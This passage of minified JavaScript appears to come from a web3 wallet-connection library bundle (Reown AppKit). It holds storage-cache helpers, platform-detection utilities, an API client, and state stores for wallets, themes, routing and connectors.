Pe.getItem(ke.CONNECTED_SOCIAL_USERNAME)}catch{console.info("Unable to get connected social username")}},getStoredActiveCaipNetworkId(){var r;const t=Pe.getItem(ke.ACTIVE_CAIP_NETWORK_ID);return(r=t==null?void 0:t.split(":"))==null?void 0:r[1]},setConnectionStatus(t){try{Pe.setItem(ke.CONNECTION_STATUS,t)}catch{console.info("Unable to set connection status")}},getConnectionStatus(){try{return Pe.getItem(ke.CONNECTION_STATUS)}catch{return}},getConnectedNamespaces(){try{const t=Pe.getItem(ke.CONNECTED_NAMESPACES);return t!=null&&t.length?t.split(","):[]}catch{return[]}},setConnectedNamespaces(t){try{const e=Array.from(new Set(t));Pe.setItem(ke.CONNECTED_NAMESPACES,e.join(","))}catch{console.info("Unable to set namespaces in storage")}},addConnectedNamespace(t){try{const e=le.getConnectedNamespaces();e.includes(t)||(e.push(t),le.setConnectedNamespaces(e))}catch{console.info("Unable to add connected namespace")}},removeConnectedNamespace(t){try{const e=le.getConnectedNamespaces(),r=e.indexOf(t);r>-1&&(e.splice(r,1),le.setConnectedNamespaces(e))}catch{console.info("Unable to remove connected namespace")}},getTelegramSocialProvider(){try{return Pe.getItem(ke.TELEGRAM_SOCIAL_PROVIDER)}catch{return console.info("Unable to get telegram social provider"),null}},setTelegramSocialProvider(t){try{Pe.setItem(ke.TELEGRAM_SOCIAL_PROVIDER,t)}catch{console.info("Unable to set telegram social provider")}},removeTelegramSocialProvider(){try{Pe.removeItem(ke.TELEGRAM_SOCIAL_PROVIDER)}catch{console.info("Unable to remove telegram social provider")}},getBalanceCache(){let t={};try{const e=Pe.getItem(ke.PORTFOLIO_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return t},removeAddressFromBalanceCache(t){try{const e=le.getBalanceCache();Pe.setItem(ke.PORTFOLIO_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove address from balance cache",t)}},getBalanceCacheForCaipAddress(t){try{const r=le.getBalanceCache()[t];if(r&&!this.isCacheExpired(r.timestamp,this.cacheExpiry.portfolio))return r.balance;le.removeAddressFromBalanceCache(t)}catch{console.info("Unable to get balance cache for address",t)}},updateBalanceCache(t){try{const e=le.getBalanceCache();e[t.caipAddress]=t,Pe.setItem(ke.PORTFOLIO_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",t)}},getNativeBalanceCache(){let t={};try{const e=Pe.getItem(ke.NATIVE_BALANCE_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return t},removeAddressFromNativeBalanceCache(t){try{const e=le.getBalanceCache();Pe.setItem(ke.NATIVE_BALANCE_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove address from balance cache",t)}},getNativeBalanceCacheForCaipAddress(t){try{const r=le.getNativeBalanceCache()[t];if(r&&!this.isCacheExpired(r.timestamp,this.cacheExpiry.nativeBalance))return r;console.info("Discarding cache for address",t),le.removeAddressFromBalanceCache(t)}catch{console.info("Unable to get balance cache for address",t)}},updateNativeBalanceCache(t){try{const e=le.getNativeBalanceCache();e[t.caipAddress]=t,Pe.setItem(ke.NATIVE_BALANCE_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",t)}},getEnsCache(){let t={};try{const e=Pe.getItem(ke.ENS_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get ens name cache")}return t},getEnsFromCacheForAddress(t){try{const r=le.getEnsCache()[t];if(r&&!this.isCacheExpired(r.timestamp,this.cacheExpiry.ens))return r.ens;le.removeEnsFromCache(t)}catch{console.info("Unable to get ens name from cache",t)}},updateEnsCache(t){try{const e=le.getEnsCache();e[t.address]=t,Pe.setItem(ke.ENS_CACHE,JSON.stringify(e))}catch{console.info("Unable to update ens name cache",t)}},removeEnsFromCache(t){try{const e=le.getEnsCache();Pe.setItem(ke.ENS_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove ens name from cache",t)}},getIdentityCache(){let t={};try{const e=Pe.getItem(ke.IDENTITY_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get identity cache")}return t},getIdentityFromCacheForAddress(t){try{const r=le.getIdentityCache()[t];if(r&&!this.isCacheExpired(r.timestamp,this.cacheExpiry.identity))return r.identity;le.removeIdentityFromCache(t)}catch{console.info("Unable to get identity from cache",t)}},updateIdentityCache(t){try{const e=le.getIdentityCache();e[t.address]={identity:t.identity,timestamp:t.timestamp},Pe.setItem(ke.IDENTITY_CACHE,JSON.stringify(e))}catch{console.info("Unable to update identity cache",t)}},removeIdentityFromCache(t){try{const e=le.getIdentityCache();Pe.setItem(ke.IDENTITY_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove identity from cache",t)}},clearAddressCache(){try{Pe.removeItem(ke.PORTFOLIO_CACHE),Pe.removeItem(ke.NATIVE_BALANCE_CACHE),Pe.removeItem(ke.ENS_CACHE),Pe.removeItem(ke.IDENTITY_CACHE)}catch{console.info("Unable to clear address cache")}},setPreferredAccountTypes(t){try{Pe.setItem(ke.PREFERRED_ACCOUNT_TYPES,JSON.stringify(t))}catch{console.info("Unable to set preferred account types",t)}},getPreferredAccountTypes(){try{const t=Pe.getItem(ke.PREFERRED_ACCOUNT_TYPES);return JSON.parse(t)}catch{console.info("Unable to get preferred account types")}}},Ie={isMobile(){var t;return this.isClient()?!!((t=window==null?void 0:window.matchMedia("(pointer:coarse)"))!=null&&t.matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},checkCaipNetwork(t,e=""){return t==null?void 0:t.caipNetworkId.toLocaleLowerCase().includes(e.toLowerCase())},isAndroid(){if(!this.isMobile())return!1;const t=window==null?void 0:window.navigator.userAgent.toLowerCase();return Ie.isMobile()&&t.includes("android")},isIos(){if(!this.isMobile())return!1;const t=window==null?void 0:window.navigator.userAgent.toLowerCase();return t.includes("iphone")||t.includes("ipad")},isSafari(){return this.isClient()?(window==null?void 0:window.navigator.userAgent.toLowerCase()).includes("safari"):!1},isClient(){return typeof window<"u"},isPairingExpired(t){return t?t-Date.now()<=Ar.TEN_SEC_MS:!0},isAllowedRetry(t,e=Ar.ONE_SEC_MS){return Date.now()-t>=e},copyToClopboard(t){navigator.clipboard.writeText(t)},isIframe(){try{return(window==null?void 0:window.self)!==(window==null?void 0:window.top)}catch{return!1}},getPairingExpiry(){return Date.now()+Ar.FOUR_MINUTES_MS},getNetworkId(t){return t==null?void 0:t.split(":")[1]},getPlainAddress(t){return t==null?void 0:t.split(":")[2]},async wait(t){return new Promise(e=>{setTimeout(e,t)})},debounce(t,e=500){let r;return(...n)=>{function i(){t(...n)}r&&clearTimeout(r),r=setTimeout(i,e)}},isHttpUrl(t){return t.startsWith("http://")||t.startsWith("https://")},formatNativeUrl(t,e){if(Ie.isHttpUrl(t))return this.formatUniversalUrl(t,e);let r=t;r.includes("://")||(r=t.replaceAll("/","").replaceAll(":",""),r=`${r}://`),r.endsWith("/")||(r=`${r}/`),this.isTelegram()&&this.isAndroid()&&(e=encodeURIComponent(e));const n=encodeURIComponent(e);return{redirect:`${r}wc?uri=${n}`,href:r}},formatUniversalUrl(t,e){if(!Ie.isHttpUrl(t))return this.formatNativeUrl(t,e);let r=t;r.endsWith("/")||(r=`${r}/`);const n=encodeURIComponent(e);return{redirect:`${r}wc?uri=${n}`,href:r}},getOpenTargetForPlatform(t){return t==="popupWindow"?t:this.isTelegram()?le.getTelegramSocialProvider()?"_top":"_blank":t},openHref(t,e,r){window==null||window.open(t,this.getOpenTargetForPlatform(e),r||"noreferrer noopener")},returnOpenHref(t,e,r){return window==null?void 0:window.open(t,this.getOpenTargetForPlatform(e),r||"noreferrer noopener")},isTelegram(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)},async preloadImage(t){const e=new Promise((r,n)=>{const i=new Image;i.onload=r,i.onerror=n,i.crossOrigin="anonymous",i.src=t});return Promise.race([e,Ie.wait(2e3)])},formatBalance(t,e){let r="0.000";if(typeof t=="string"){const n=Number(t);if(n){const i=Math.floor(n*1e3)/1e3;i&&(r=i.toString())}}return`${r}${e?` ${e}`:""}`},formatBalance2(t,e){var n;let r;if(t==="0")r="0";else if(typeof t=="string"){const i=Number(t);i&&(r=(n=i.toString().match(/^-?\d+(?:\.\d{0,3})?/u))==null?void 0:n[0])}return{value:r??"0",rest:r==="0"?"000":"",symbol:e}},getApiUrl(){return Z.W3M_API_URL},getBlockchainApiUrl(){return Z.BLOCKCHAIN_API_RPC_URL},getAnalyticsUrl(){return Z.PULSE_API_URL},getUUID(){return crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})},parseError(t){var e,r;return typeof t=="string"?t:typeof((r=(e=t==null?void 0:t.issues)==null?void 0:e[0])==null?void 0:r.message)=="string"?t.issues[0].message:t instanceof Error?t.message:"Unknown error"},sortRequestedNetworks(t,e=[]){const r={};return e&&t&&(t.forEach((n,i)=>{r[n]=i}),e.sort((n,i)=>{const s=r[n.id],o=r[i.id];return s!==void 0&&o!==void 0?s-o:s!==void 0?-1:o!==void 0?1:0})),e},calculateBalance(t){let e=0;for(const r of t)e+=r.value??0;return e},formatTokenBalance(t){const e=t.toFixed(2),[r,n]=e.split(".");return{dollars:r,pennies:n}},isAddress(t,e="eip155"){switch(e){case"eip155":if(/^(?:0x)?[0-9a-f]{40}$/iu.test(t)){if(/^(?:0x)?[0-9a-f]{40}$/iu.test(t)||/^(?:0x)?[0-9A-F]{40}$/iu.test(t))return!0}else return!1;return!1;case"solana":return/[1-9A-HJ-NP-Za-km-z]{32,44}$/iu.test(t);default:return!1}},uniqueBy(t,e){const r=new Set;return t.filter(n=>{const i=n[e];return r.has(i)?!1:(r.add(i),!0)})},generateSdkVersion(t,e,r){const i=t.length===0?Ar.ADAPTER_TYPES.UNIVERSAL:t.map(s=>s.adapterType).join(",");return`${e}-${i}-${r}`},createAccount(t,e,r,n,i){return{namespace:t,address:e,type:r,publicKey:n,path:i}},isCaipAddress(t){if(typeof t!="string")return!1;const e=t.split(":"),r=e[0];return e.filter(Boolean).length===3&&r in Z.CHAIN_NAME_MAP},isMac(){const t=window==null?void 0:window.navigator.userAgent.toLowerCase();return t.includes("macintosh")&&!t.includes("safari")},formatTelegramSocialLoginUrl(t){const e=`--${encodeURIComponent(window==null?void 0:window.location.href)}`,r="state=";if(new URL(t).host==="auth.magic.link"){const i="provider_authorization_url=",s=t.substring(t.indexOf(i)+i.length),o=this.injectIntoUrl(decodeURIComponent(s),r,e);return t.replace(s,encodeURIComponent(o))}return this.injectIntoUrl(t,r,e)},injectIntoUrl(t,e,r){const n=t.indexOf(e);if(n===-1)throw new Error(`${e} parameter not found in the URL: ${t}`);const i=t.indexOf("&",n),s=e.length,o=i!==-1?i:t.length,a=t.substring(0,n+s),c=t.substring(n+s,o),u=t.substring(i),l=c+r;return a+l+u}};async function Yc(...t){const e=await fetch(...t);if(!e.ok)throw new Error(`HTTP status code: ${e.status}`,{cause:e});return e}class vf{constructor({baseUrl:e,clientId:r}){this.baseUrl=e,this.clientId=r}async get({headers:e,signal:r,cache:n,...i}){const s=this.createUrl(i);return(await Yc(s,{method:"GET",headers:e,signal:r,cache:n})).json()}async getBlob({headers:e,signal:r,...n}){const i=this.createUrl(n);return(await Yc(i,{method:"GET",headers:e,signal:r})).blob()}async post({body:e,headers:r,signal:n,...i}){const s=this.createUrl(i);return(await Yc(s,{method:"POST",headers:r,body:e?JSON.stringify(e):void 0,signal:n})).json()}async put({body:e,headers:r,signal:n,...i}){const s=this.createUrl(i);return(await Yc(s,{method:"PUT",headers:r,body:e?JSON.stringify(e):void 0,signal:n})).json()}async delete({body:e,headers:r,signal:n,...i}){const s=this.createUrl(i);return(await Yc(s,{method:"DELETE",headers:r,body:e?JSON.stringify(e):void 0,signal:n})).json()}createUrl({path:e,params:r}){const n=new URL(e,this.baseUrl);return r&&Object.entries(r).forEach(([i,s])=>{s&&n.searchParams.append(i,s)}),this.clientId&&n.searchParams.append("clientId",this.clientId),n}}const TS={handleSolanaDeeplinkRedirect(t){if(q.state.activeChain===Z.CHAIN.SOLANA){const e=window.location.href,r=encodeURIComponent(e);if(t==="Phantom"&&!("phantom"in window)){const n=e.startsWith("https")?"https":"http",i=e.split("/")[2],s=encodeURIComponent(`${n}://${i}`);window.location.href=`https://phantom.app/ul/browse/${r}?ref=${s}`}t==="Coinbase Wallet"&&!("coinbaseSolana"in window)&&(window.location.href=`https://go.cb-w.com/dapp?cb_url=${r}`)}}},bn=Kt({walletImages:{},networkImages:{},chainImages:{},connectorImages:{},tokenImages:{},currencyImages:{}}),ui={state:bn,subscribeNetworkImages(t){return Xr(bn.networkImages,()=>t(bn.networkImages))},subscribeKey(t,e){return tn(bn,t,e)},subscribe(t){return Xr(bn,()=>t(bn))},setWalletImage(t,e){bn.walletImages[t]=e},setNetworkImage(t,e){bn.networkImages[t]=e},setChainImage(t,e){bn.chainImages[t]=e},setConnectorImage(t,e){bn.connectorImages={...bn.connectorImages,[t]:e}},setTokenImage(t,e){bn.tokenImages[t]=e},setCurrencyImage(t,e){bn.currencyImages[t]=e}},PS={eip155:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",solana:"a1b58899-f671-4276-6a5e-56ca5bd59700",polkadot:"",bip122:"0b4838db-0161-4ffe-022d-532bf03dba00"},xp=Kt({networkImagePromises:{}}),T1={async fetchWalletImage(t){if(t)return await xe._fetchWalletImage(t),this.getWalletImageById(t)},async fetchNetworkImage(t){if(!t)return;const e=this.getNetworkImageById(t);return e||(xp.networkImagePromises[t]||(xp.networkImagePromises[t]=xe._fetchNetworkImage(t)),await xp.networkImagePromises[t],this.getNetworkImageById(t))},getWalletImageById(t){if(t)return ui.state.walletImages[t]},getWalletImage(t){if(t!=null&&t.image_url)return t==null?void 0:t.image_url;if(t!=null&&t.image_id)return ui.state.walletImages[t.image_id]},getNetworkImage(t){var e,r,n;if((e=t==null?void 0:t.assets)!=null&&e.imageUrl)return(r=t==null?void 0:t.assets)==null?void 0:r.imageUrl;if((n=t==null?void 0:t.assets)!=null&&n.imageId)return ui.state.networkImages[t.assets.imageId]},getNetworkImageById(t){if(t)return ui.state.networkImages[t]},getConnectorImage(t){if(t!=null&&t.imageUrl)return t.imageUrl;if(t!=null&&t.imageId)return ui.state.connectorImages[t.imageId]},getChainImage(t){return ui.state.networkImages[PS[t]]}},RS={getFeatureValue(t,e){const r=e==null?void 0:e[t];return r===void 0?Ar.DEFAULT_FEATURES[t]:r},filterSocialsByPlatform(t){if(!t||!t.length)return t;if(Ie.isTelegram()){if(Ie.isIos())return t.filter(e=>e!=="google");if(Ie.isMac())return t.filter(e=>e!=="x");if(Ie.isAndroid())return t.filter(e=>!["facebook","x"].includes(e))}return t}},Ee=Kt({features:Ar.DEFAULT_FEATURES,projectId:"",sdkType:"appkit",sdkVersion:"html-wagmi-undefined",defaultAccountTypes:{solana:"eoa",bip122:"payment",polkadot:"eoa",eip155:"smartAccount"},enableNetworkSwitch:!0}),te={state:Ee,subscribeKey(t,e){return tn(Ee,t,e)},setOptions(t){Object.assign(Ee,t)},setFeatures(t){if(!t)return;Ee.features||(Ee.features=Ar.DEFAULT_FEATURES);const e={...Ee.features,...t};Ee.features=e,Ee.features.socials&&(Ee.features.socials=RS.filterSocialsByPlatform(Ee.features.socials))},setProjectId(t){Ee.projectId=t},setCustomRpcUrls(t){Ee.customRpcUrls=t},setAllWallets(t){Ee.allWallets=t},setIncludeWalletIds(t){Ee.includeWalletIds=t},setExcludeWalletIds(t){Ee.excludeWalletIds=t},setFeaturedWalletIds(t){Ee.featuredWalletIds=t},setTokens(t){Ee.tokens=t},setTermsConditionsUrl(t){Ee.termsConditionsUrl=t},setPrivacyPolicyUrl(t){Ee.privacyPolicyUrl=t},setCustomWallets(t){Ee.customWallets=t},setIsSiweEnabled(t){Ee.isSiweEnabled=t},setIsUniversalProvider(t){Ee.isUniversalProvider=t},setSdkVersion(t){Ee.sdkVersion=t},setMetadata(t){Ee.metadata=t},setDisableAppend(t){Ee.disableAppend=t},setEIP6963Enabled(t){Ee.enableEIP6963=t},setDebug(t){Ee.debug=t},setEnableWalletConnect(t){Ee.enableWalletConnect=t},setEnableWalletGuide(t){Ee.enableWalletGuide=t},setEnableAuthLogger(t){Ee.enableAuthLogger=t},setEnableWallets(t){Ee.enableWallets=t},setHasMultipleAddresses(t){Ee.hasMultipleAddresses=t},setSIWX(t){Ee.siwx=t},setConnectMethodsOrder(t){Ee.features={...Ee.features,connectMethodsOrder:t}},setWalletFeaturesOrder(t){Ee.features={...Ee.features,walletFeaturesOrder:t}},setSocialsOrder(t){Ee.features={...Ee.features,socials:t}},setCollapseWallets(t){Ee.features={...Ee.features,collapseWallets:t}},setEnableEmbedded(t){Ee.enableEmbedded=t},setAllowUnsupportedChain(t){Ee.allowUnsupportedChain=t},setManualWCControl(t){Ee.manualWCControl=t},setEnableNetworkSwitch(t){Ee.enableNetworkSwitch=t},setDefaultAccountTypes(t={}){Object.entries(t).forEach(([e,r])=>{r&&(Ee.defaultAccountTypes[e]=r)})},setUniversalProviderConfigOverride(t){Ee.universalProviderConfigOverride=t},getUniversalProviderConfigOverride(){return Ee.universalProviderConfigOverride},getSnapshot(){return ju(Ee)}},Rs=Kt({message:"",variant:"info",open:!1}),Wo={state:Rs,subscribeKey(t,e){return tn(Rs,t,e)},open(t,e){const{debug:r}=te.state,{shortMessage:n,longMessage:i}=t;r&&(Rs.message=n,Rs.variant=e,Rs.open=!0),i&&console.error(typeof i=="function"?i():i)},close(){Rs.open=!1,Rs.message="",Rs.variant="info"}},OS=Ie.getAnalyticsUrl(),kS=new vf({baseUrl:OS,clientId:null}),DS=["MODAL_CREATED"],Yi=Kt({timestamp:Date.now(),reportedErrors:{},data:{type:"track",event:"MODAL_CREATED"}}),wt={state:Yi,subscribe(t){return Xr(Yi,()=>t(Yi))},getSdkProperties(){const{projectId:t,sdkType:e,sdkVersion:r}=te.state;return{projectId:t,st:e,sv:r||"html-wagmi-4.2.2"}},async _sendAnalyticsEvent(t){try{const e=pe.state.address;if(DS.includes(t.data.event)||typeof window>"u")return;await kS.post({path:"/e",params:wt.getSdkProperties(),body:{eventId:Ie.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:t.timestamp,props:{...t.data,address:e}}}),Yi.reportedErrors.FORBIDDEN=!1}catch(e){e instanceof Error&&e.cause instanceof Response&&e.cause.status===Z.HTTP_STATUS_CODES.FORBIDDEN&&!Yi.reportedErrors.FORBIDDEN&&(Wo.open({shortMessage:"Invalid App Configuration",longMessage:`Origin ${vu()?window.origin:"uknown"} not found on Allowlist - update configuration on cloud.reown.com`},"error"),Yi.reportedErrors.FORBIDDEN=!0)}},sendEvent(t){var e;Yi.timestamp=Date.now(),Yi.data=t,(e=te.state.features)!=null&&e.analytics&&wt._sendAnalyticsEvent(Yi)}},MS=["1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79","fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa","a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393"],BS=Ie.getApiUrl(),Dn=new vf({baseUrl:BS,clientId:null}),US=40,aw=4,$S=20,st=Kt({promises:{},page:1,count:0,featured:[],allFeatured:[],recommended:[],allRecommended:[],wallets:[],search:[],isAnalyticsEnabled:!1,excludedWallets:[],isFetchingRecommendedWallets:!1}),xe={state:st,subscribeKey(t,e){return tn(st,t,e)},_getSdkProperties(){const{projectId:t,sdkType:e,sdkVersion:r}=te.state;return{projectId:t,st:e||"appkit",sv:r||"html-wagmi-4.2.2"}},_filterOutExtensions(t){return te.state.isUniversalProvider?t.filter(e=>!!(e.mobile_link||e.desktop_link||e.webapp_link)):t},async _fetchWalletImage(t){const e=`${Dn.baseUrl}/getWalletImage/${t}`,r=await Dn.getBlob({path:e,params:xe._getSdkProperties()});ui.setWalletImage(t,URL.createObjectURL(r))},async _fetchNetworkImage(t){const e=`${Dn.baseUrl}/public/getAssetImage/${t}`,r=await Dn.getBlob({path:e,params:xe._getSdkProperties()});ui.setNetworkImage(t,URL.createObjectURL(r))},async _fetchConnectorImage(t){const e=`${Dn.baseUrl}/public/getAssetImage/${t}`,r=await Dn.getBlob({path:e,params:xe._getSdkProperties()});ui.setConnectorImage(t,URL.createObjectURL(r))},async _fetchCurrencyImage(t){const e=`${Dn.baseUrl}/public/getCurrencyImage/${t}`,r=await Dn.getBlob({path:e,params:xe._getSdkProperties()});ui.setCurrencyImage(t,URL.createObjectURL(r))},async _fetchTokenImage(t){const e=`${Dn.baseUrl}/public/getTokenImage/${t}`,r=await Dn.getBlob({path:e,params:xe._getSdkProperties()});ui.setTokenImage(t,URL.createObjectURL(r))},async fetchNetworkImages(){const t=q.getAllRequestedCaipNetworks(),e=t==null?void 0:t.map(({assets:r})=>r==null?void 0:r.imageId).filter(Boolean).filter(r=>!T1.getNetworkImageById(r));e&&await Promise.allSettled(e.map(r=>xe._fetchNetworkImage(r)))},async fetchConnectorImages(){const{connectors:t}=Oe.state,e=t.map(({imageId:r})=>r).filter(Boolean);await Promise.allSettled(e.map(r=>xe._fetchConnectorImage(r)))},async fetchCurrencyImages(t=[]){await Promise.allSettled(t.map(e=>xe._fetchCurrencyImage(e)))},async fetchTokenImages(t=[]){await Promise.allSettled(t.map(e=>xe._fetchTokenImage(e)))},async fetchWallets(t){var n,i;const e=t.exclude??[];return xe._getSdkProperties().sv.startsWith("html-core-")&&e.push(...MS),await Dn.get({path:"/getWallets",params:{...xe._getSdkProperties(),...t,page:String(t.page),entries:String(t.entries),include:(n=t.include)==null?void 0:n.join(","),exclude:(i=t.exclude)==null?void 0:i.join(",")}})},async fetchFeaturedWallets(){const{featuredWalletIds:t}=te.state;if(t!=null&&t.length){const e={...xe._getSdkProperties(),page:1,entries:(t==null?void 0:t.length)??aw,include:t},{data:r}=await xe.fetchWallets(e);r.sort((i,s)=>t.indexOf(i.id)-t.indexOf(s.id));const n=r.map(i=>i.image_id).filter(Boolean);await Promise.allSettled(n.map(i=>xe._fetchWalletImage(i))),st.featured=r,st.allFeatured=r}},async fetchRecommendedWallets(){try{st.isFetchingRecommendedWallets=!0;const{includeWalletIds:t,excludeWalletIds:e,featuredWalletIds:r}=te.state,n=[...e??[],...r??[]].filter(Boolean),i=q.getRequestedCaipNetworkIds().join(","),s={page:1,entries:aw,include:t,exclude:n,chains:i},{data:o,count:a}=await xe.fetchWallets(s),c=le.getRecentWallets(),u=o.map(h=>h.image_id).filter(Boolean),l=c.map(h=>h.image_id).filter(Boolean);await Promise.allSettled([...u,...l].map(h=>xe._fetchWalletImage(h))),st.recommended=o,st.allRecommended=o,st.count=a??0}catch{}finally{st.isFetchingRecommendedWallets=!1}},async fetchWalletsByPage({page:t}){const{includeWalletIds:e,excludeWalletIds:r,featuredWalletIds:n}=te.state,i=q.getRequestedCaipNetworkIds().join(","),s=[...st.recommended.map(({id:l})=>l),...r??[],...n??[]].filter(Boolean),o={page:t,entries:US,include:e,exclude:s,chains:i},{data:a,count:c}=await xe.fetchWallets(o),u=a.slice(0,$S).map(l=>l.image_id).filter(Boolean);await Promise.allSettled(u.map(l=>xe._fetchWalletImage(l))),st.wallets=Ie.uniqueBy([...st.wallets,...xe._filterOutExtensions(a)],"id"),st.count=c>st.count?c:st.count,st.page=t},async initializeExcludedWallets({ids:t}){const e=q.getRequestedCaipNetworkIds().join(","),r={page:1,entries:t.length,include:t,chains:e},{data:n}=await xe.fetchWallets(r);n&&n.forEach(i=>{st.excludedWallets.push({rdns:i.rdns,name:i.name})})},async searchWallet({search:t,badge:e}){const{includeWalletIds:r,excludeWalletIds:n}=te.state,i=q.getRequestedCaipNetworkIds().join(",");st.search=[];const s={page:1,entries:100,search:t==null?void 0:t.trim(),badge_type:e,include:r,exclude:n,chains:i},{data:o}=await xe.fetchWallets(s);wt.sendEvent({type:"track",event:"SEARCH_WALLET",properties:{badge:e??"",search:t??""}});const a=o.map(c=>c.image_id).filter(Boolean);await Promise.allSettled([...a.map(c=>xe._fetchWalletImage(c)),Ie.wait(300)]),st.search=xe._filterOutExtensions(o)},initPromise(t,e){const r=st.promises[t];return r||(st.promises[t]=e())},prefetch({fetchConnectorImages:t=!0,fetchFeaturedWallets:e=!0,fetchRecommendedWallets:r=!0,fetchNetworkImages:n=!0}={}){const i=[t&&xe.initPromise("connectorImages",xe.fetchConnectorImages),e&&xe.initPromise("featuredWallets",xe.fetchFeaturedWallets),r&&xe.initPromise("recommendedWallets",xe.fetchRecommendedWallets),n&&xe.initPromise("networkImages",xe.fetchNetworkImages)].filter(Boolean);return Promise.allSettled(i)},prefetchAnalyticsConfig(){var t;(t=te.state.features)!=null&&t.analytics&&xe.fetchAnalyticsConfig()},async fetchAnalyticsConfig(){try{const{isAnalyticsEnabled:t}=await Dn.get({path:"/getAnalyticsConfig",params:xe._getSdkProperties()});te.setFeatures({analytics:t})}catch{te.setFeatures({analytics:!1})}},setFilterByNamespace(t){if(!t){st.featured=st.allFeatured,st.recommended=st.allRecommended;return}const e=q.getRequestedCaipNetworkIds().join(",");st.featured=st.allFeatured.filter(r=>{var n;return(n=r.chains)==null?void 0:n.some(i=>e.includes(i))}),st.recommended=st.allRecommended.filter(r=>{var n;return(n=r.chains)==null?void 0:n.some(i=>e.includes(i))})}},nt=Kt({view:"Connect",history:["Connect"],transactionStack:[]}),at={state:nt,subscribeKey(t,e){return tn(nt,t,e)},pushTransactionStack(t){nt.transactionStack.push(t)},popTransactionStack(t){var r,n;const e=nt.transactionStack.pop();if(e)if(t)this.goBack(),(r=e==null?void 0:e.onCancel)==null||r.call(e);else{if(e.goBack)this.goBack();else if(e.replace){const s=nt.history.indexOf("ConnectingSiwe");s>0?this.goBackToIndex(s-1):(nr.close(),nt.history=[])}else e.view&&this.reset(e.view);(n=e==null?void 0:e.onSuccess)==null||n.call(e)}},push(t,e){t!==nt.view&&(nt.view=t,nt.history.push(t),nt.data=e)},reset(t,e){nt.view=t,nt.history=[t],nt.data=e},replace(t,e){nt.history.at(-1)===t||(nt.view=t,nt.history[nt.history.length-1]=t,nt.data=e)},goBack(){var e;const t=!q.state.activeCaipAddress&&this.state.view==="ConnectingFarcaster";if(nt.history.length>1&&!nt.history.includes("UnsupportedChain")){nt.history.pop();const[r]=nt.history.slice(-1);r&&(nt.view=r)}else nr.close();(e=nt.data)!=null&&e.wallet&&(nt.data.wallet=void 0),setTimeout(()=>{var r,n,i;if(t){pe.setFarcasterUrl(void 0,q.state.activeChain);const s=Oe.getAuthConnector();(r=s==null?void 0:s.provider)==null||r.reload();const o=ju(te.state);(i=(n=s==null?void 0:s.provider)==null?void 0:n.syncDappData)==null||i.call(n,{metadata:o.metadata,sdkVersion:o.sdkVersion,projectId:o.projectId,sdkType:o.sdkType})}},100)},goBackToIndex(t){if(nt.history.length>1){nt.history=nt.history.slice(0,t+1);const[e]=nt.history.slice(-1);e&&(nt.view=e)}}},Ji=Kt({themeMode:"dark",themeVariables:{},w3mThemeVariables:void 0}),jr={state:Ji,subscribe(t){return Xr(Ji,()=>t(Ji))},setThemeMode(t){Ji.themeMode=t;try{const e=Oe.getAuthConnector();if(e){const r=jr.getSnapshot().themeVariables;e.provider.syncTheme({themeMode:t,themeVariables:r,w3mThemeVariables:hs(r,t)})}}catch{console.info("Unable to sync theme to auth connector")}},setThemeVariables(t){Ji.themeVariables={...Ji.themeVariables,...t};try{const e=Oe.getAuthConnector();if(e){const r=jr.getSnapshot().themeVariables;e.provider.syncTheme({themeVariables:r,w3mThemeVariables:hs(Ji.themeVariables,Ji.themeMode)})}}catch{console.info("Unable to sync theme to auth connector")}},getSnapshot(){return ju(Ji)}},P1={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0},ot=Kt({allConnectors:[],connectors:[],activeConnector:void 0,filterByNamespace:void 0,activeConnectorIds:{...P1}}),Oe={state:ot,subscribe(t){return Xr(ot,()=>{t(ot)})},subscribeKey(t,e){return tn(ot,t,e)},initialize(t){t.forEach(e=>{const r=le.getConnectedConnectorId(e);r&&this.setConnectorId(r,e)})},setActiveConnector(t){t&&(ot.activeConnector=Jo(t))},setConnectors(t){t.filter(r=>!ot.allConnectors.some(n=>n.id===r.id&&this.getConnectorName(n.name)===this.getConnectorName(r.name)&&n.chain===r.chain)).forEach(r=>{r.type!=="MULTI_CHAIN"&&ot.allConnectors.push(Jo(r))}),ot.connectors=this.mergeMultiChainConnectors(ot.allConnectors)},removeAdapter(t){ot.allConnectors=ot.allConnectors.filter(e=>e.chain!==t),ot.connectors=this.mergeMultiChainConnectors(ot.allConnectors)},mergeMultiChainConnectors(t){const e=this.generateConnectorMapByName(t),r=[];return e.forEach(n=>{const i=n[0],s=(i==null?void 0:i.id)===Z.CONNECTOR_ID.AUTH;n.length>1&&i?r.push({name:i.name,imageUrl:i.imageUrl,imageId:i.imageId,connectors:[...n],type:s?"AUTH":"MULTI_CHAIN",chain:"eip155",id:(i==null?void 0:i.id)||""}):i&&r.push(i)}),r},generateConnectorMapByName(t){const e=new Map;return t.forEach(r=>{const{name:n}=r,i=this.getConnectorName(n);if(!i)return;const s=e.get(i)||[];s.find(a=>a.chain===r.chain)||s.push(r),e.set(i,s)}),e},getConnectorName(t){return t&&({"Trust Wallet":"Trust"}[t]||t)},getUniqueConnectorsByName(t){const e=[];return t.forEach(r=>{e.find(n=>n.chain===r.chain)||e.push(r)}),e},addConnector(t){var 